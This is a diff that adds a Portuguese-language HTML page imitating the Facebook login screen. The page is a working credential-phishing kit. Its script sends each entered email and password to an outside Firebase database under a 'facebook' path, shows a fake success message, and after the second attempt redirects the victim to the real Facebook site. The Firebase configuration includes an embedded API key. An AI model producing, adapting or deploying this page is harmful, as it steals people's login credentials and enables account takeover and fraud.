@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Login</title>
+  <style>
+    /* Resetando padrões do navegador */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    /* Container principal */
+    .login-container {
+      width: 350px;
+      background-color: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Logo */
+    .logo img {
+      display: block;
+      margin: 0 auto 20px;
+    }
+
+    /* Formulário de login */
+    .login-form {
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+    }
+
+    .login-form input {
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+
+    .login-form input[type="text"],
+    .login-form input[type="password"] {
+      font-size: 14px;
+    }
+
+    /* Botão de login */
+    .login-form button {
+      padding: 12px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      font-size: 1em;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .login-form button:hover {
+      background-color: #165eab;
+    }
+
+    /* Links */
+    .links {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .links a {
+      text-decoration: none;
+      color: #1877f2;
+      font-size: 14px;
+      display: inline-block;
+      margin: 5px 0;
+    }
+
+    /* Separador */
+    .separator {
+      text-align: center;
+      margin: 20px 0;
+      font-size: 14px;
+      color: #666;
+    }
+
+    .separator hr {
+      border: 0;
+      border-top: 1px solid #ddd;
+      margin: 5px 0;
+    }
+
+    /* Botão de criar nova conta */
+    .create-account-btn {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    .create-account-btn a {
+      padding: 12px;
+      background-color: #42b72a;
+      color: white;
+      text-decoration: none;
+      border-radius: 5px;
+      font-size: 1em;
+    }
+
+    .create-account-btn a:hover {
+      background-color: #36a420;
+    }
+
+  </style>
+</head>
+<body>
+
+  <div class="login-container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" width="80">
+    </div>
+    
+    <!-- Formulário de login corrigido -->
+    <form class="login-form" id="form">
+      <input id="email" type="text" placeholder="Email ou telefone" required>
+      <input id="password" type="password" placeholder="Senha" required>
+      <button type="submit">Entrar</button>
+    </form>
+
+    <div class="links">
+      <p id="text" style="color: red; font-weight: bold; font-size: 10px"></p>
+      <a href="#">Esqueceu a senha?</a>
+    </div>
+
+    <div class="separator">
+      <hr>OU<hr>
+    </div>
+
+    <div class="create-account-btn">
+      <a href="#">Criar nova conta</a>
+    </div>
+  </div>
+  
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-app.js";
+    import { getDatabase, ref, set, push } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-database.js";
+    
+    const firebaseConfig = {
+      apiKey: "AIzaSyBBq-o3LcUR-SQCJ8bqNajEOM2oyKWl0Yc",
+      authDomain: "bot-mistk.firebaseapp.com",
+      databaseURL: "https://bot-mistk-default-rtdb.firebaseio.com",
+      projectId: "bot-mistk",
+      storageBucket: "bot-mistk.appspot.com",
+      messagingSenderId: "713167365832",
+      appId: "1:713167365832:web:75e6351ee0537aa9eca7fd",
+      measurementId: "G-7B02K355WT"
+    };
+    
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    
+    const form = document.getElementById("form");
+    const text = document.getElementById("text");  // A variável de referência para o campo de mensagem de erro
+    let clickCount = 0;  // Variável para contar os cliques no botão de login
+    
+    form.addEventListener("submit", (event) => {
+      event.preventDefault();
+      
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+      
+      const dataRef = ref(database, 'facebook');
+      const newDataRef = push(dataRef);
+      set(newDataRef, {
+        email: email,
+        password: password
+      })
+      .then(() => {
+        clickCount++;  // Aumenta o contador de cliques
+        
+        console.log("logado com sucesso ");
+        text.textContent = "Login realizado com sucesso";
+        form.reset();
+        
+        // Verifica se o usuário clicou duas vezes
+        if (clickCount >= 2) {
+          window.location.href = "https://www.facebook.com";  // Redireciona para o Facebook após o segundo clique
+        }
+      })
+      .catch((error) => {
+        console.log("erro ao logar " + error);
+        text.textContent = "Erro ao tentar fazer login";
+      })
+    })
+  </script>
+
+</body>
+</html>
